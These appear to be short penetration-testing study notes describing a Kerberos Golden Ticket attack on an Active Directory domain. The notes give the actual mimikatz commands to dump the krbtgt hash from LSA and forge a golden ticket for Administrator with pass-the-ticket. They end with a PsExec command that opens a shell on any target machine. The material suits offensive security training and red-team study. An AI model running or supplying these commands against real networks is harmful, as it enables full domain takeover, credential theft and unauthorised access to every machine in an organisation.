## Golden Ticket Attacks Overview
- When we compromise the krbtgt account, we own the domain
- We can request access to any resource or system on the domain
- Golden tickets == complete access to every machine

### Attack
- Use mimikatz
- Set privilege to debug `privilege::debug`
- LSA dump: `lsadump::lsa /inject /name:krbtgt`
- We need krbtgt NTLM hash and domain SID
- Then we can generate golden ticket `kerberos:golden /User:Administrator /domain:<domain> /sid:<sid> /krbtgt:<hash> /id:500 /ptt`
- Pass the ticket to access any machine `PsExec64.exe \\< target ip> cmd.exe`
